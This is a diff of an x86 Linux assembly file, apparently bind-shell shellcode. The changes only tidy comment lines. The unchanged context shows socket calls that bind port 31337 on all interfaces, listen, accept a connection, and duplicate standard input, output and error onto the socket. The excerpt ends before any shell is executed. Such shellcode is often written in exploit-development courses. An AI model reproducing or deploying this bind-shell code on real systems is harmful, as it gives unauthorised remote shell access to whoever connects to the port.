@@ -60,12 +60,10 @@ rocknroll:
 
     mov edi, eax
 
-    ;
     ; now we bind the socket to 0.0.0.0 port 31337
     ;
     ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
     ; bind(fd, [AF_INET=2, 31337, 0], 16)
-    ;
 
     xor eax, eax
     mov al, 102             ; eax: syscall 102 (socket)
@@ -89,11 +87,9 @@ rocknroll:
 
     int 0x80                ; trigger syscall
 
-    ;
     ; next setup listen() to listen for connections
     ;
     ; int listen(int sockfd, int backlog);
-    ;
 
     mov eax, esi
     mov ebx, eax
@@ -105,11 +101,9 @@ rocknroll:
     mov ecx,esp             ; write args to ecx
     int 0x80                ; trigger syscall
 
-    ;
     ; after listen() follows accept()
     ;
     ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-    ;
 
     mov al, 102             ; socket syscall
     inc ebx                 ; type 5 = accept()
@@ -121,10 +115,8 @@ rocknroll:
 
     mov edi, eax            ; save fd
 
-    ;
     ; now create copies of the 3 file descriptions 0 = STDIN, 1 = STDOUT, 2 = STDERR
     ; int dup2(int oldfd, int newfd);
-    ;
 
     mov ebx, edi            ; socket fd
     xor ecx, ecx
